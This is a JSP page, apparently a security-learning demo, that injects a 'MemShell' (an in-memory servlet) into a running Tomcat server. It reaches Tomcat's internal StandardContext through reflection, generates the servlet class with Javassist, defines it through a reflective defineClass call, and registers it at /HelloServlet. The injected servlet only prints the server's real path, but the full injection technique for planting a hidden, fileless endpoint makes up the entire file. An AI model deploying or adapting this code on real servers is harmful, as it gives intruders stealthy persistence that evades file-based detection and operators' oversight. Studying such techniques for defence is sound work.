<%@ page contentType="text/html;charset=UTF-8" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="javassist.ClassPool" %>
<%@ page import="javassist.CtClass" %>
<%@ page import="javassist.LoaderClassPath" %>
<%@ page import="javassist.CtMethod" %>
<%@ page import="java.lang.reflect.Modifier" %>
<%!
    Class<?> definedClass(ClassLoader classLoader, byte[] bytes) throws Exception {
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);

        return (Class<?>) method.invoke(classLoader, bytes, 0, bytes.length);
    }

    byte[] createServletClass(ClassLoader classLoader) throws Exception {
        // 使用Javassist创建类字节码
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new LoaderClassPath(classLoader));
        CtClass ctServletClass = classPool.makeClass(
                "org.javaweb.servlet.HelloServlet", classPool.get("javax.servlet.http.HttpServlet")
        );

        CtClass[] args = new CtClass[]{
                classPool.get("javax.servlet.http.HttpServletRequest"),
                classPool.get("javax.servlet.http.HttpServletResponse")
        };

        CtMethod ctMethod = new CtMethod(CtClass.voidType, "service", args, ctServletClass);
        ctMethod.setModifiers(Modifier.PUBLIC);
        ctMethod.setBody("$2.getWriter().println($1.getRealPath(\"/\"));");

        ctServletClass.addMethod(ctMethod);

        // 生成类字节码
        byte[] bytes = ctServletClass.toBytecode();

        // 释放资源
        ctServletClass.detach();

        return bytes;
    }
%>

<%
    //    String servletName = request.getParameter("servletName");
    //    String servletPath = request.getParameter("servletPath");
    String servletName = "HelloServlet";
    String servletPath = "/HelloServlet";

    // org.apache.catalina.core.ApplicationContextFacade
    ServletContext servletContext = request.getServletContext();

    // 如果已有此 servletName 的 MemShellUtils，则不再重复添加
    if (servletContext.getServletRegistration(servletName) == null) {
        // 获取ApplicationContext
        Field contextField = servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);

        // 获取StandardContext
        Field contextField2 = applicationContext.getClass().getDeclaredField("context");
        contextField2.setAccessible(true);
        StandardContext context = (StandardContext) contextField2.get(applicationContext);

        // 获取context类加载
        ClassLoader classLoader = context.getClass().getClassLoader();

        // 创建类字节码
        byte[] bytes = createServletClass(classLoader);

        // 创建类实例
        Class<?> servletClass = definedClass(classLoader, bytes);

        // 注册Servlet
        Wrapper wrapper = context.createWrapper();
        wrapper.setName(servletName);
        wrapper.setLoadOnStartup(1);
        wrapper.setServlet((Servlet) servletClass.newInstance());
        wrapper.setServletClass(servletClass.getName());
        context.addChild(wrapper);
        context.addServletMapping(servletPath, servletName);
    }

    out.println("MemShell Servlet: " + servletName + ", servletPath: " + servletPath);
%>